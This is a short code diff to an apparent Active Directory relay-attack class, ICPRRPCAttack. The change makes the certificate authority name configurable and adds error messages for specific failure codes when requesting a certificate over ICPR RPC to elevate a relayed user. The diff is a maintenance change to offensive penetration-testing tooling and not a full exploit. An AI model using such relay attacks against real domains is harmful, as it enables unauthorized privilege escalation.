@@ -141,9 +141,14 @@ class ICPRRPCAttack:
 
         LOG.info("Getting certificate...")
         try:
-            certificate = icpr.hCertServerRequest(self.dce, csr, attributes, ca="DC1-CA")
+            certificate = icpr.hCertServerRequest(self.dce, csr, attributes, ca=self.config.icpr_ca_name)
         except DCERPCSessionError as e:
-            LOG.error("Error occured while getting certificate: %s Maybe encryption is enforced?" % e)
+            if e.error_code == 0x80070057:
+                LOG.error("Error occured while getting certificate: %s Check your CA name?" % e)
+            elif e.error_code == 0x80070005:
+                LOG.error("Error occured while getting certificate: %s Maybe encryption is enforced?" % e)
+            else:
+                LOG.error("Unknown error occured while getting certificate: %s" % e)
             return
 
         ELEVATED.append(self.username)
